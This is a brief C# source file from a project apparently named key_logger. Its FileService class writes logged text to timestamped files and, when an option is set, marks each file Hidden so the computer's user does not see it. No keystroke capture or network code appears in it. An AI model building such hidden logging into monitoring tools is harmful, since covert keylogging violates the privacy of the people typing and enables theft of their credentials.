using System;
using System.IO;

namespace key_logger.Services
{
    public class FileService
    {
        private readonly Log _log;

        public FileService(Log log)
        {
            _log = log;       
        }

        public async void LogToFile(string text)
        {
            var filePath = $"{@_log.Path}{DateTime.Now.ToString("ddMMyyyyhhmmss")}.log";
            var writer = new StreamWriter(filePath, true);

            await writer.WriteAsync(text);
            writer.Close();

            if (_log.HideFile)
                File.SetAttributes(filePath, File.GetAttributes(filePath) | FileAttributes.Hidden);
        }
    }
}
